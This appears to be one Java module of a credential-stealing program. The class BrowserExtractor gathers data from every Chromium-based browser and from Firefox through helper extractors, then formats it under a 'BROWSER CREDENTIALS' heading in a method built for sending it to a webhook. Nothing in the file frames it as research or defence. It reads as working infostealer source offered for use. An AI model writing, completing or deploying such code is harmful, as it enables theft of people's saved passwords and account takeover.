package me.visoxd.browser;

import java.util.HashMap;
import java.util.Map;

public class BrowserExtractor {
    
    public static Map<String, String> extractAllBrowserData() {
        Map<String, String> allData = new HashMap<>();
        
        try {
            // Extract from Chromium-based browsers
            String chromiumData = ChromiumExtractor.extractAllChromiumBrowsers();
            if (chromiumData != null && !chromiumData.isEmpty()) {
                allData.put("chromium_browsers", chromiumData);
            }
            
            // Extract from Firefox
            String firefoxData = FirefoxExtractor.extractFirefoxData();
            if (firefoxData != null && !firefoxData.isEmpty()) {
                allData.put("firefox", firefoxData);
            }
            
        } catch (Exception e) {
            System.out.println("[BrowserExtractor] Error: " + e.getMessage());
        }
        
        return allData;
    }
    
    public static String formatDataForWebhook(Map<String, String> browserData) {
        if (browserData == null || browserData.isEmpty()) {
            return "";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("=== BROWSER CREDENTIALS ===\n\n");
        
        for (Map.Entry<String, String> entry : browserData.entrySet()) {
            result.append(entry.getValue()).append("\n");
        }
        
        return result.toString();
    }
}
